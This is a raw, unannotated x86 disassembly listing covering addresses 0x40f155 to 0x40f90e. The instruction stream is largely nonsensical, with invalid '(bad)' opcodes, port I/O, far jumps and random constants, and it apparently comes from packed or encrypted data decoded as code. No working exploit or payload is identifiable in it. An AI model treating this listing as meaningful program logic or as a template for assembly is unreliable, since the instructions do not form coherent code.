  40f155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f156:	and    ah,BYTE PTR [edx+0x44d750fa]
  40f15c:	popa   
  40f15d:	mov    ecx,esp
  40f15f:	push   ss
  40f160:	xchg   esi,eax
  40f161:	jae    0x40f0f3
  40f163:	add    BYTE PTR [ebx],ah
  40f165:	lock adc dl,BYTE PTR [eax]
  40f168:	jns    0x40f13d
  40f16a:	mov    ah,0x31
  40f16c:	sub    eax,0x2c23ebb9
  40f171:	out    0xdd,al
  40f173:	imul   BYTE PTR [ecx-0x3d]
  40f176:	cs push es
  40f178:	in     eax,dx
  40f179:	bound  edi,QWORD PTR [ecx+eax*2-0x1f]
  40f17d:	adc    BYTE PTR [ebx*4+0x72800f28],dh
  40f184:	pop    ecx
  40f185:	mov    ecx,0xc47d92af
  40f18a:	jmp    0x21dad334
  40f18f:	loopne 0x40f15b
  40f191:	test   esp,ebp
  40f193:	nop
  40f194:	inc    ebp
  40f195:	in     eax,0x1c
  40f197:	in     al,0xcd
  40f199:	in     eax,dx
  40f19a:	fsubr  DWORD PTR [ebx+0xe6fc595]
  40f1a0:	dec    ecx
  40f1a1:	stc    
  40f1a2:	and    BYTE PTR [ebx+0x60037e37],bl
  40f1a8:	sub    edx,DWORD PTR [edx+edx*8+0x6b959569]
  40f1af:	push   ebx
  40f1b0:	inc    edx
  40f1b1:	or     dl,BYTE PTR [edi-0x2]
  40f1b4:	jmp    0xea047c1f
  40f1b9:	and    eax,0x79b29633
  40f1be:	scas   al,BYTE PTR es:[edi]
  40f1bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1c0:	mov    eax,0x20c7aba7
  40f1c5:	imul   DWORD PTR [edi-0x29]
  40f1c8:	sub    BYTE PTR [esi-0x49f8908f],0x9
  40f1cf:	sbb    al,0x93
  40f1d1:	nop
  40f1d2:	loop   0x40f1a8
  40f1d4:	jmp    0x40f24b
  40f1d6:	stos   DWORD PTR es:[edi],eax
  40f1d7:	sub    eax,0xf1b209a3
  40f1dc:	(bad)
  40f1df:	jge    0x40f231
  40f1e1:	cmp    dl,0x8f
  40f1e4:	push   0xfffffff3
  40f1e6:	stos   BYTE PTR es:[edi],al
  40f1e7:	int    0xf1
  40f1e9:	leave  
  40f1ea:	xor    ah,BYTE PTR [ebx]
  40f1ec:	mov    edx,0x65308a74
  40f1f1:	push   0xc0f8f5c4
  40f1f6:	mov    al,0x88
  40f1f8:	cs (bad) 
  40f1fa:	fmul   QWORD PTR [esi-0x1c037498]
  40f200:	fidiv  WORD PTR [di+0x15]
  40f204:	ss not dl
  40f207:	xor    ax,0x3757
  40f20b:	fistp  WORD PTR [ebx]
  40f20d:	rcr    DWORD PTR [eax-0x21],cl
  40f210:	mov    bh,0x4e
  40f212:	jmp    0x357:0x7307159e
  40f219:	cmp    esi,edi
  40f21b:	lods   eax,DWORD PTR ds:[esi]
  40f21c:	push   edx
  40f21d:	dec    ebp
  40f21e:	sbb    eax,0x4dcd83bd
  40f223:	sahf   
  40f224:	int3   
  40f225:	pusha  
  40f226:	xchg   ebp,eax
  40f227:	sar    BYTE PTR [ecx],1
  40f229:	inc    ecx
  40f22a:	iret   
  40f22b:	retf   
  40f22c:	jo     0x40f267
  40f22e:	pop    ecx
  40f22f:	xchg   edx,eax
  40f230:	pop    edi
  40f231:	xchg   BYTE PTR [edi+0x6f194512],dl
  40f237:	aam    0xb2
  40f239:	cmc    
  40f23a:	stos   DWORD PTR es:[edi],eax
  40f23b:	(bad)  
  40f23c:	std    
  40f23d:	test   al,0xbe
  40f23f:	call   0x52749800
  40f244:	hlt    
  40f245:	mov    ch,0x6
  40f247:	daa    
  40f248:	repnz inc esi
  40f24a:	fimul  WORD PTR [edx]
  40f24c:	fild   QWORD PTR [eax]
  40f24e:	fidiv  DWORD PTR [edi+0x640eefd5]
  40f254:	cmc    
  40f255:	jmp    0x5551:0x4b28f015
  40f25c:	push   ds
  40f25d:	ror    DWORD PTR [eax-0x28],0x54
  40f261:	mov    ?,eax
  40f263:	ret    
  40f264:	push   esp
  40f265:	sahf   
  40f266:	jg     0x40f2d5
  40f268:	pop    ebp
  40f269:	adc    BYTE PTR [esp],0x19
  40f26d:	jge    0x40f2d5
  40f26f:	aas    
  40f270:	fstp   st(2)
  40f272:	jae    0x40f284
  40f274:	sbb    al,0x52
  40f276:	or     BYTE PTR [ecx-0x6606a50a],al
  40f27c:	xchg   BYTE PTR [edx+0x2a],dh
  40f27f:	inc    esi
  40f280:	mov    edi,0xae035b1c
  40f285:	push   ebx
  40f286:	out    0xf5,al
  40f288:	loope  0x40f273
  40f28a:	gs ret 0xf5a3
  40f28e:	data16 sbb dh,bh
  40f291:	xor    BYTE PTR [ecx+0x328d3322],bh
  40f297:	mov    cl,0x2c
  40f299:	loopne 0x40f2da
  40f29b:	inc    ebp
  40f29c:	or     eax,DWORD PTR [ebx]
  40f29e:	dec    DWORD PTR [esi-0x31]
  40f2a1:	loop   0x40f252
  40f2a3:	mov    al,0x5c
  40f2a5:	jge    0x40f23c
  40f2a7:	or     DWORD PTR [edx],eax
  40f2a9:	pop    ebx
  40f2aa:	cmp    DWORD PTR [ecx-0x78e0b12c],eax
  40f2b0:	mov    edi,0x9e620316
  40f2b5:	fmul   QWORD PTR [ebx+0xbf56b6f]
  40f2bb:	mov    ch,0xc4
  40f2bd:	rcr    DWORD PTR [eax],0x3b
  40f2c0:	iret   
  40f2c1:	xchg   DWORD PTR [ebx+0x2897d4b3],edx
  40f2c7:	cdq    
  40f2c8:	mov    DWORD PTR [ebx+esi*1+0x31f82fe],esp
  40f2cf:	dec    edi
  40f2d0:	lods   al,BYTE PTR ds:[esi]
  40f2d1:	je     0x40f2e9
  40f2d3:	shr    BYTE PTR [esi],0x8a
  40f2d6:	leave  
  40f2d7:	in     eax,0x44
  40f2d9:	xor    edi,esp
  40f2db:	push   eax
  40f2dc:	stc    
  40f2dd:	ss pop es
  40f2df:	jns    0x40f2f9
  40f2e1:	outs   dx,DWORD PTR ds:[esi]
  40f2e2:	fdivr  st,st(6)
  40f2e4:	jne    0x40f350
  40f2e6:	rol    BYTE PTR [edx-0x44],cl
  40f2e9:	or     cl,ah
  40f2eb:	in     eax,0xc9
  40f2ed:	jns    0x40f315
  40f2ef:	ret    0x848
  40f2f2:	adc    DWORD PTR [edi-0x674225cd],0xffffff8a
  40f2f9:	nop
  40f2fa:	js     0x40f378
  40f2fc:	jmp    0xd8b80e8a
  40f301:	mov    edx,0xb60e1dc2
  40f306:	scas   eax,DWORD PTR es:[edi]
  40f307:	mov    ds:0xe80ee174,al
  40f30c:	sbb    al,0x5e
  40f30e:	adc    eax,0xf7d69e07
  40f313:	imul   esp,edi,0x35
  40f316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f317:	push   ds
  40f318:	sbb    al,0x57
  40f31a:	mov    al,ds:0x791fcfb6
  40f31f:	pushf  
  40f320:	jae    0x40f399
  40f322:	sub    BYTE PTR [eax+0x36a6f765],0x1d
  40f329:	bound  esi,QWORD PTR [edi+esi*4+0x4d]
  40f32d:	pop    eax
  40f32e:	ret    0x4735
  40f331:	aam    0xe
  40f333:	sahf   
  40f334:	add    ch,BYTE PTR [esi-0x64]
  40f337:	stos   BYTE PTR es:[edi],al
  40f338:	iret   
  40f339:	gs xchg edx,eax
  40f33b:	or     edx,eax
  40f33d:	mov    BYTE PTR ss:[ebx],cl
  40f340:	daa    
  40f341:	loope  0x40f2c6
  40f343:	sbb    cl,BYTE PTR [ebx-0x529fc4c6]
  40f349:	rcr    bh,0xd
  40f34c:	xchg   esi,eax
  40f34d:	(bad)  
  40f34f:	jns    0x40f330
  40f351:	retf   
  40f352:	nop
  40f353:	or     al,0xdb
  40f355:	nop
  40f356:	xor    dl,BYTE PTR [edi+edi*4+0x5c521ae]
  40f35d:	fs ret 
  40f35f:	cmp    dl,ah
  40f361:	jns    0x40f33e
  40f363:	fxch   st(1)
  40f365:	lods   al,BYTE PTR ds:[esi]
  40f366:	cmc    
  40f367:	jle    0x40f319
  40f369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f36a:	std    
  40f36b:	std    
  40f36c:	sbb    eax,0x9231966f
  40f371:	pusha  
  40f372:	mov    bh,0xbc
  40f374:	rcr    BYTE PTR [edx-0x19b3718],1
  40f37a:	push   edi
  40f37b:	and    edx,DWORD PTR [esp+esi*1-0x457debbe]
  40f382:	cmp    edx,ebp
  40f384:	mov    ecx,0x7e0ab055
  40f389:	push   DWORD PTR [ecx-0x30]
  40f38c:	pusha  
  40f38d:	adc    eax,DWORD PTR [edx+0x10]
  40f390:	nop
  40f391:	jmp    0x40f3e5
  40f393:	out    dx,al
  40f394:	(bad)  
  40f395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f396:	cmp    al,BYTE PTR [eax+0x38f0f2db]
  40f39c:	or     eax,0xbf2c1b62
  40f3a1:	je     0x40f41a
  40f3a3:	jbe    0x40f41c
  40f3a5:	mov    eax,ds:0x6a2528b5
  40f3aa:	nop
  40f3ab:	push   ds
  40f3ac:	mov    esi,0xd3d01b40
  40f3b1:	ret    0xc08f
  40f3b4:	fxrstor [ecx]
  40f3b7:	mov    ds:0x6f31108a,eax
  40f3bc:	sbb    eax,0x4c9f162f
  40f3c1:	inc    edx
  40f3c2:	add    eax,0xa68c4a20
  40f3c7:	imul   edx,DWORD PTR [esi-0x313e1a75],0x9b84c5d9
  40f3d1:	call   DWORD PTR [esp+ebx*2+0xc08e019]
  40f3d8:	cdq    
  40f3d9:	sbb    eax,0xb9aa1d1d
  40f3de:	mov    dh,0xd4
  40f3e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3e1:	inc    ecx
  40f3e2:	dec    ebx
  40f3e3:	add    DWORD PTR [ecx-0x5d],esi
  40f3e6:	(bad)  ds:0x31612779
  40f3ec:	fwait
  40f3ed:	js     0x40f43a
  40f3ef:	sbb    al,0xda
  40f3f1:	pop    esp
  40f3f2:	or     cl,al
  40f3f4:	pop    esi
  40f3f6:	mov    ah,0xdf
  40f3f8:	ds nop
  40f3fa:	imul   ecx,DWORD PTR [edi+0x33],0xffffffa9
  40f3fe:	push   ss
  40f3ff:	and    eax,0xe8261ef1
  40f404:	mov    BYTE PTR [edi-0x221842ac],ch
  40f40a:	rol    DWORD PTR [edi+0x1031992a],1
  40f410:	pop    ss
  40f411:	mov    edx,0x428eb5f5
  40f416:	xchg   esi,eax
  40f417:	mov    dl,BYTE PTR [esi]
  40f419:	xor    BYTE PTR [ebx+0x4bb62b8],0xbd
  40f420:	stos   BYTE PTR es:[edi],al
  40f421:	add    esi,DWORD PTR [eax]
  40f423:	into   
  40f424:	push   0xa02d03c9
  40f429:	mov    ss,WORD PTR [ecx+0x2630a08c]
  40f42f:	jo     0x40f3e8
  40f431:	mov    ss,ecx
  40f433:	mov    al,BYTE PTR [eax-0x51d3e45c]
  40f439:	retf   
  40f43a:	aam    0x18
  40f43c:	xchg   bh,bh
  40f43e:	inc    esi
  40f43f:	outs   dx,DWORD PTR ds:[esi]
  40f440:	cmc    
  40f441:	ret    
  40f442:	out    0xd4,eax
  40f444:	adc    ecx,DWORD PTR [ebx]
  40f446:	nop
  40f447:	js     0x40f44f
  40f449:	push   cs
  40f44a:	popf   
  40f44b:	cmp    dh,0xe6
  40f44e:	and    edi,DWORD PTR [ebx+edi*4-0x4c3bd5cf]
  40f455:	xor    eax,0x64efab51
  40f45a:	cld    
  40f45b:	ja     0x40f476
  40f45d:	fistp  WORD PTR [edx]
  40f45f:	frstor [ecx+eiz*2-0x31]
  40f463:	xor    BYTE PTR ds:0x37a329c3,dl
  40f469:	adc    bh,BYTE PTR [edi+0x30]
  40f46c:	lock xchg DWORD PTR [ecx-0x589d5b9],esi
  40f473:	shl    DWORD PTR [edi],1
  40f475:	inc    edx
  40f476:	repz xor eax,0xfe44d29e
  40f47c:	ins    DWORD PTR es:[edi],dx
  40f47d:	stos   BYTE PTR es:[edi],al
  40f47e:	jmp    DWORD PTR [esi+0x4154d7f2]
  40f484:	ret    
  40f485:	imul   esp,DWORD PTR [ebx-0x65],0xb6d2a109
  40f48c:	sbb    dh,ch
  40f48e:	mov    eax,0xbb70889c
  40f493:	ins    BYTE PTR es:[edi],dx
  40f494:	cld    
  40f495:	scas   eax,DWORD PTR es:[edi]
  40f496:	sbb    ecx,ebp
  40f498:	rcl    DWORD PTR [edx-0x746800c],0x70
  40f49f:	pop    esi
  40f4a0:	cmp    BYTE PTR [eax],0xed
  40f4a3:	inc    ebp
  40f4a4:	popa   
  40f4a5:	push   ebp
  40f4a6:	inc    edi
  40f4a7:	jmp    0x85cb276e
  40f4ac:	inc    edx
  40f4ad:	mov    edi,0xa1b7d251
  40f4b2:	xchg   esi,eax
  40f4b3:	fwait
  40f4b4:	jae    0x40f4c3
  40f4b6:	or     al,0xe0
  40f4b8:	push   es
  40f4b9:	(bad)  
  40f4ba:	(bad)
  40f4bf:	out    0x71,al
  40f4c1:	imul   BYTE PTR [ecx-0x20c66293]
  40f4c7:	lahf   
  40f4c8:	les    edx,FWORD PTR [eax+0x52]
  40f4cb:	xchg   ebx,eax
  40f4cc:	cmc    
  40f4cd:	daa    
  40f4ce:	out    0xb4,eax
  40f4d0:	add    edx,DWORD PTR [edi+0x480115a9]
  40f4d6:	aam    0xa7
  40f4d8:	cmp    esi,DWORD PTR [eax+ebx*4-0x5cf0684e]
  40f4df:	mov    ecx,0xa21dbcc5
  40f4e4:	scas   eax,DWORD PTR es:[edi]
  40f4e5:	adc    DWORD PTR [edx-0x3dd7e678],edx
  40f4eb:	call   0x1621b664
  40f4f0:	arpl   WORD PTR [eax],sp
  40f4f2:	sbb    DWORD PTR [eax+0x47],0x95b92453
  40f4f9:	dec    edi
  40f4fa:	sbb    al,0xac
  40f4fc:	mov    esp,esi
  40f4fe:	mov    bl,0x4a
  40f500:	push   edi
  40f501:	cli    
  40f502:	dec    edi
  40f503:	lea    eax,[edi]
  40f505:	rcl    BYTE PTR [edx-0x3cac8d6f],0x7
  40f50c:	pop    esi
  40f50d:	jecxz  0x40f48f
  40f50f:	fldcw  WORD PTR [esi-0x4d]
  40f512:	pushf  
  40f513:	or     al,0xa2
  40f515:	das    
  40f516:	fwait
  40f517:	jecxz  0x40f4e8
  40f519:	aam    0x5e
  40f51b:	cwde   
  40f51c:	inc    esp
  40f51d:	test   BYTE PTR [edi-0x76],dh
  40f520:	inc    esi
  40f521:	in     eax,dx
  40f522:	add    edi,ebp
  40f524:	xchg   ebx,eax
  40f525:	push   es
  40f526:	int3   
  40f527:	push   0xffffffc4
  40f529:	adc    esi,DWORD PTR [esi+0x2d]
  40f52c:	push   ds
  40f52d:	or     BYTE PTR [ebp+0x9],ah
  40f530:	cmp    DWORD PTR ds:0xafc4d0ab,0xffffffc7
  40f537:	test   BYTE PTR [ebp+0x20],0xc9
  40f53b:	mov    BYTE PTR [edx-0x7e3cd33f],ah
  40f541:	dec    eax
  40f542:	fdivr  QWORD PTR [ebx+0x71]
  40f545:	sbb    ch,BYTE PTR [ecx+0x4f590160]
  40f54b:	mov    edx,DWORD PTR [esi+eiz*4-0x5734d975]
  40f552:	mov    DWORD PTR [ebx+0x2d],0xba70ab02
  40f559:	imul   dh
  40f55b:	xchg   esp,eax
  40f55c:	je     0x40f521
  40f55e:	add    ebp,DWORD PTR [eax+eiz*1]
  40f561:	cld    
  40f562:	hlt    
  40f563:	jl     0x40f5dc
  40f565:	js     0x40f573
  40f567:	retf   0xa13c
  40f56a:	fldenv [eax+0x65]
  40f56d:	push   0x2dc8f070
  40f572:	gs inc ecx
  40f574:	jb     0x40f59e
  40f576:	arpl   dx,si
  40f578:	jmp    0xce4:0xd97d9372
  40f57f:	adc    edx,DWORD PTR [esi+0x5f]
  40f582:	jp     0x40f5e3
  40f584:	out    0xcd,al
  40f586:	jns    0x40f5d7
  40f588:	lods   eax,DWORD PTR ds:[esi]
  40f589:	inc    DWORD PTR [ebx+0x5]
  40f58c:	xor    al,0x9e
  40f58e:	nop
  40f58f:	and    dl,bl
  40f591:	imul   esp,DWORD PTR [ebx-0x6bcc1fd8],0xfffffffe
  40f598:	mov    eax,0x5ede5121
  40f59d:	pop    ds
  40f59e:	push   ss
  40f59f:	mov    bl,0x6e
  40f5a1:	jmp    0xf9e3:0xe56094c1
  40f5a8:	iret   
  40f5a9:	mov    edi,esp
  40f5ab:	mov    bl,BYTE PTR [ebx+0x21]
  40f5ae:	dec    edx
  40f5af:	sub    BYTE PTR [ecx+0x1efa6197],dh
  40f5b5:	and    BYTE PTR [edx-0x278ddadc],bh
  40f5bb:	pop    ss
  40f5bc:	inc    esp
  40f5bd:	adc    al,0x49
  40f5bf:	ja     0x40f61d
  40f5c1:	inc    edx
  40f5c2:	lods   eax,DWORD PTR ds:[esi]
  40f5c3:	cli    
  40f5c4:	(bad)  
  40f5c5:	into   
  40f5c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5c7:	and    BYTE PTR [ecx-0x6e],bl
  40f5ca:	cmp    BYTE PTR [edx-0x72330c09],ch
  40f5d0:	sub    DWORD PTR [edx+0x17c6267f],edx
  40f5d6:	aas    
  40f5d7:	int    0x10
  40f5d9:	leave  
  40f5da:	add    dl,al
  40f5dc:	rcr    DWORD PTR [esi],0xc6
  40f5df:	push   esi
  40f5e0:	jne    0x40f65b
  40f5e2:	dec    DWORD PTR [ecx+0xc5bd5ab]
  40f5e8:	or     ebp,DWORD PTR [edx+ebp*2-0x62]
  40f5ec:	shl    ch,cl
  40f5ee:	jg     0x40f639
  40f5f0:	fucom  st(6)
  40f5f2:	mov    bl,dl
  40f5f4:	sahf   
  40f5f5:	scas   al,BYTE PTR es:[edi]
  40f5f6:	xchg   edx,eax
  40f5f7:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5f9:	(bad)  
  40f5fa:	jp     0x40f61a
  40f5fc:	sub    eax,0xd73cfcc6
  40f601:	outs   dx,DWORD PTR ds:[esi]
  40f602:	and    esp,DWORD PTR [ecx]
  40f604:	adc    BYTE PTR [esi-0x7],bh
  40f607:	push   ecx
  40f608:	cs push ecx
  40f60a:	pop    ebp
  40f60b:	cli    
  40f60c:	out    dx,al
  40f60d:	jns    0x40f67d
  40f60f:	sahf   
  40f610:	jne    0x40f657
  40f612:	xlat   BYTE PTR ds:[ebx]
  40f613:	loopne 0x40f5e3
  40f615:	popf   
  40f616:	mov    bl,0x5c
  40f618:	inc    ebx
  40f619:	(bad)  
  40f61a:	mov    BYTE PTR [edi-0xd6ad868],al
  40f620:	loop   0x40f648
  40f622:	std    
  40f623:	(bad)  
  40f624:	xchg   esi,eax
  40f625:	ror    ecx,0xe2
  40f628:	xor    dh,BYTE PTR ss:[ecx+0x6bb2a164]
  40f62f:	sub    eax,0x260a14cf
  40f634:	cs sahf 
  40f636:	test   BYTE PTR [ecx-0x79],dh
  40f639:	or     al,0xa6
  40f63b:	xchg   ebx,eax
  40f63c:	outs   dx,BYTE PTR ds:[esi]
  40f63d:	mov    eax,0xf4c91506
  40f642:	dec    ebx
  40f643:	and    ecx,DWORD PTR [esi-0x2ba3a17a]
  40f649:	(bad)  
  40f64a:	cwde   
  40f64b:	loop   0x40f633
  40f64d:	push   ecx
  40f64e:	inc    esp
  40f64f:	test   al,0x8c
  40f651:	dec    eax
  40f652:	data16 out dx,al
  40f654:	imul   edx,DWORD PTR [ecx+edi*1-0x4f],0x237cdf09
  40f65c:	call   0xf95e:0xd5740174
  40f663:	fcmovnu st,st(6)
  40f665:	cld    
  40f666:	dec    DWORD PTR [edi]
  40f668:	pop    ecx
  40f669:	cli    
  40f66a:	push   edi
  40f66b:	in     eax,0xba
  40f66d:	loop   0x40f6c4
  40f66f:	(bad)  
  40f670:	pop    esp
  40f671:	retf   0x89b2
  40f674:	mov    esp,0x17991bf0
  40f679:	xchg   ecx,eax
  40f67a:	adc    esp,edx
  40f67c:	mov    al,ds:0x2a63f763
  40f681:	add    ch,BYTE PTR [edx]
  40f683:	mov    ebx,0x46637711
  40f688:	test   BYTE PTR [edx-0x21214e5],0xf5
  40f68f:	cdq    
  40f690:	inc    ecx
  40f691:	pushf  
  40f692:	mov    ecx,DWORD PTR [ebp-0x78cc1d03]
  40f698:	inc    esi
  40f699:	(bad)  
  40f69a:	mov    dl,0x17
  40f69c:	test   edx,0x43df2430
  40f6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6a3:	xor    DWORD PTR ds:0x8d839ba8,0xffffff9e
  40f6aa:	mov    ebp,0x82051bf0
  40f6af:	mov    ebp,0xcc07f4ad
  40f6b4:	jmp    0x5da6:0x22e8d1d3
  40f6bb:	mov    ch,0x24
  40f6bd:	sbb    dl,dl
  40f6bf:	cli    
  40f6c0:	fcomp  DWORD PTR [edi+0x69]
  40f6c3:	mov    al,ds:0xdc29025e
  40f6c8:	mov    esi,0x49750bf6
  40f6cd:	push   esi
  40f6ce:	mov    al,ds:0x411a9813
  40f6d3:	icebp  
  40f6d4:	jb     0x40f6de
  40f6d6:	dec    edx
  40f6d7:	lods   eax,DWORD PTR ds:[esi]
  40f6d8:	adc    al,0xbc
  40f6da:	push   0x1388d284
  40f6df:	mov    WORD PTR [ecx+0x63d952b2],fs
  40f6e5:	in     al,dx
  40f6e6:	or     DWORD PTR [ecx+0x24],esp
  40f6e9:	adc    esp,DWORD PTR [edx+0x63]
  40f6ec:	inc    eax
  40f6ed:	sti    
  40f6ee:	jge    0x40f73d
  40f6f0:	(bad)  
  40f6f1:	xchg   ebp,eax
  40f6f2:	mov    al,0x98
  40f6f4:	ret    0x4e8c
  40f6f7:	cs call 0xbb3f:0xc88faa7a
  40f6ff:	xchg   ebx,eax
  40f700:	fisub  WORD PTR [edi]
  40f702:	out    0x3a,al
  40f704:	or     DWORD PTR [ebx],edi
  40f706:	gs jns 0x40f6a0
  40f709:	xor    ah,BYTE PTR [edi+ecx*8-0x57]
  40f70d:	in     eax,dx
  40f70e:	jl     0x40f736
  40f710:	mov    ebp,0x9ede8734
  40f715:	pop    ebp
  40f716:	jne    0x40f788
  40f718:	lods   eax,DWORD PTR ds:[esi]
  40f719:	xlat   BYTE PTR ds:[bx]
  40f71b:	inc    edx
  40f71c:	xchg   edi,eax
  40f71d:	jmp    0x40f790
  40f71f:	mov    al,0x65
  40f721:	mov    al,ds:0x97e7304f
  40f726:	outs   dx,BYTE PTR ds:[esi]
  40f727:	lock retf 
  40f729:	xchg   DWORD PTR [edi+eiz*8],edi
  40f72c:	or     ecx,0x79
  40f72f:	push   esi
  40f730:	mov    dl,0x88
  40f732:	daa    
  40f733:	inc    ebx
  40f734:	fstp   DWORD PTR ds:0x3786b122
  40f73a:	mov    edi,0x58c5873e
  40f73f:	ror    esi,1
  40f741:	outs   dx,DWORD PTR ds:[esi]
  40f742:	mov    ds:0x571d4c14,eax
  40f747:	mov    edx,0x3bf04006
  40f74c:	loop   0x40f780
  40f74e:	mov    esi,0x758d2356
  40f753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f754:	js     0x40f709
  40f756:	pop    ecx
  40f757:	out    0xab,eax
  40f759:	rol    BYTE PTR [edx+0x2c],1
  40f75c:	jne    0x40f720
  40f75e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f75f:	fsubr  DWORD PTR [esi]
  40f761:	sub    bh,BYTE PTR [ecx+0x7f]
  40f764:	sar    DWORD PTR ds:0x6d52011,0x94
  40f76b:	and    eax,0xfe10ae8a
  40f770:	jp     0x40f7d6
  40f772:	mov    DWORD PTR [eax],edi
  40f774:	mov    eax,ds:0xa310d187
  40f779:	in     eax,dx
  40f77a:	bswap  esi
  40f77c:	mul    BYTE PTR [edi-0x64f53712]
  40f782:	test   eax,0xbf1ca3e3
  40f787:	jmp    0x5488bdf7
  40f78c:	mov    cl,0xd2
  40f78e:	push   esi
  40f78f:	jl     0x40f805
  40f791:	repz adc DWORD PTR [ecx],eax
  40f794:	rcr    DWORD PTR [ecx+0x1173bde7],cl
  40f79a:	add    BYTE PTR ds:0x720117b6,ah
  40f7a0:	push   0xfffffff3
  40f7a2:	or     eax,0xd31e6ce3
  40f7a7:	mov    eax,esi
  40f7a9:	ja     0x40f7d4
  40f7ab:	mov    al,BYTE PTR [eax-0x3b]
  40f7ae:	sbb    BYTE PTR [esi-0x8ba5798],bl
  40f7b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7b5:	pop    ebp
  40f7b6:	mov    ds:0x207d2f95,eax
  40f7bb:	mov    edx,0xad961b66
  40f7c0:	jl     0x40f773
  40f7c2:	inc    ecx
  40f7c3:	ret    
  40f7c4:	and    edi,DWORD PTR [eax]
  40f7c6:	mov    esi,0x8e04557d
  40f7cb:	or     eax,0x597b466c
  40f7d0:	and    BYTE PTR [ecx+ebx*1],dl
  40f7d3:	or     BYTE PTR [edi-0x24],bl
  40f7d6:	imul   ebx,DWORD PTR [edi-0x77835ad3],0x24
  40f7dd:	out    dx,eax
  40f7de:	bound  ebx,QWORD PTR [edi-0x73]
  40f7e1:	add    eax,0xebf7e13f
  40f7e6:	cmp    al,0x26
  40f7e8:	jmp    0x7e3261d6
  40f7ed:	xchg   DWORD PTR [esi+0x183e2a5b],esp
  40f7f3:	or     ah,dl
  40f7f5:	sub    eax,eax
  40f7f7:	ins    DWORD PTR es:[edi],dx
  40f7f8:	xchg   ebp,eax
  40f7f9:	icebp  
  40f7fa:	mov    al,ds:0x6aab8d79
  40f7ff:	fs scas eax,DWORD PTR es:[edi]
  40f801:	add    ebp,DWORD PTR [esi]
  40f803:	pop    edx
  40f804:	ins    DWORD PTR es:[edi],dx
  40f805:	push   esp
  40f806:	push   ss
  40f807:	jecxz  0x40f799
  40f809:	jnp    0x40f883
  40f80b:	int    0x49
  40f80d:	ins    BYTE PTR es:[edi],dx
  40f80e:	ss pop edx
  40f810:	cmp    al,0x2d
  40f812:	adc    DWORD PTR [eax],ebp
  40f814:	lea    eax,[ecx+eax*2-0xf]
  40f818:	cli    
  40f819:	dec    esp
  40f81a:	dec    edx
  40f81b:	push   ecx
  40f81c:	clc    
  40f81d:	fnstcw WORD PTR [eax]
  40f81f:	out    0x26,eax
  40f821:	in     al,dx
  40f822:	pop    ebp
  40f823:	pop    esp
  40f824:	cli    
  40f825:	jmp    0x8db7963
  40f82a:	xchg   ebx,eax
  40f82b:	in     eax,0xc5
  40f82d:	sub    eax,0x4ca6e20c
  40f832:	pop    edi
  40f833:	mov    al,ds:0x12818e83
  40f838:	xchg   edi,eax
  40f839:	ret    0xdb04
  40f83c:	dec    ebx
  40f83d:	adc    DWORD PTR [esi],edi
  40f83f:	adc    al,0x9f
  40f841:	pop    edx
  40f842:	sbb    DWORD PTR [ebp*1-0x4603bb84],esi
  40f849:	(bad)  
  40f84a:	cmp    ah,bl
  40f84c:	data16 mov al,0xa0
  40f84f:	(bad)  
  40f850:	out    dx,eax
  40f851:	adc    DWORD PTR [esi+0x1f],edi
  40f854:	push   es
  40f855:	mov    ebp,0x9ff00d18
  40f85a:	ret    0x4467
  40f85d:	idiv   BYTE PTR [ebx]
  40f85f:	or     DWORD PTR [eax+0x418fcf],0x9206a119
  40f869:	push   0x31308c2b
  40f86e:	fnstenv [edi+0x594b98e8]
  40f874:	imul   esi,eax,0x5c6e6279
  40f87a:	test   DWORD PTR [esi],esi
  40f87c:	lods   eax,DWORD PTR ds:[esi]
  40f87d:	popf   
  40f87e:	repnz int 0x2f
  40f881:	fbld   TBYTE PTR [edi-0x63eda204]
  40f887:	retf   0x66c
  40f88a:	add    bh,BYTE PTR [ecx+0xfa99320]
  40f890:	mov    ah,0xd5
  40f892:	sbb    BYTE PTR [edx-0x3c74bd4e],cl
  40f898:	push   ecx
  40f899:	add    DWORD PTR [ebp+eax*4+0x417fd6cb],eax
  40f8a0:	jno    0x40f882
  40f8a2:	push   ss
  40f8a3:	ret    
  40f8a4:	clc    
  40f8a5:	or     al,0x8a
  40f8a7:	inc    esi
  40f8a8:	fwait
  40f8a9:	add    eax,0x7e
  40f8ac:	lods   eax,DWORD PTR ds:[esi]
  40f8ad:	pop    esi
  40f8ae:	aas    
  40f8af:	jno    0x40f887
  40f8b1:	push   es
  40f8b2:	in     al,dx
  40f8b3:	adc    al,cl
  40f8b5:	mov    esi,0xa0f42041
  40f8ba:	clc    
  40f8bb:	or     al,BYTE PTR [edx+edx*1-0x450f8bbf]
  40f8c2:	sbb    ebp,0xf4469684
  40f8c8:	mov    eax,DWORD PTR [ebp-0x173f0f3]
  40f8ce:	pop    edx
  40f8cf:	mov    ebp,ebp
  40f8d1:	add    DWORD PTR [ebx],esp
  40f8d3:	jmp    0x40f93f
  40f8d5:	out    0x7,ax
  40f8d8:	je     0x40f8de
  40f8da:	test   al,0x2
  40f8dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8dd:	jo     0x40f8b7
  40f8df:	hlt    
  40f8e0:	in     al,dx
  40f8e1:	fs cmp al,0x27
  40f8e4:	and    al,0xf4
  40f8e6:	mov    gs,ecx
  40f8e8:	dec    ebx
  40f8e9:	cmp    al,0x91
  40f8eb:	dec    eax
  40f8ec:	jle    0x40f88b
  40f8ee:	getsec 
  40f8f0:	inc    edx
  40f8f1:	mov    al,ds:0x908d1dc1
  40f8f6:	jne    0x40f88c
  40f8f8:	call   0xea82232d
  40f8fd:	es inc esp
  40f8ff:	aas    
  40f900:	lds    ebp,FWORD PTR [esi+0x14]
  40f903:	dec    ebp
  40f904:	(bad)
  40f907:	cmp    eax,0x4458d4a
  40f90c:	out    0xf6,eax
  40f90e:	outs   dx,BYTE PTR ds:[esi]
